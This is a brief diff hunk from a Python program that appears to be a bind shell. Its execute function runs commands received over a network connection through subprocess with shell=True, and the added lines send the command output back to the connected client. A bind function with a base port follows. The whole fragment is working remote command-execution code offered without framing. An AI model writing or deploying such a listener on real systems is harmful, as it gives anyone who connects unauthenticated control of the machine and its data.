@@ -16,6 +16,8 @@ def execute(connection):
             break
         process = subprocess.Popen(received, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         stdout, stderr = process.communicate()
+        result = stdout if len(stdout) else stderr
+        connection.send(result)
 
 def bind():
     port = BASE_PORT
